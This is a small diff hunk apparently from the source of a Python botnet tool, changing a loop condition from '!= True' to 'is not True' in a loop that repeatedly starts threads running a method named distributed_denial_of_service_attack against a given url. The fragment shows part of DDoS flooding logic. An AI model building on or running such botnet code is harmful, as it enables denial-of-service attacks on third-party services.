@@ -120,7 +120,7 @@ class Botnet:
             pass
 
 
-        while self.stopDDoSbool != True:
+        while self.stopDDoSbool is not True:
             threading.Thread(target=self.distributed_denial_of_service_attack, args=[url]).start()
 
 
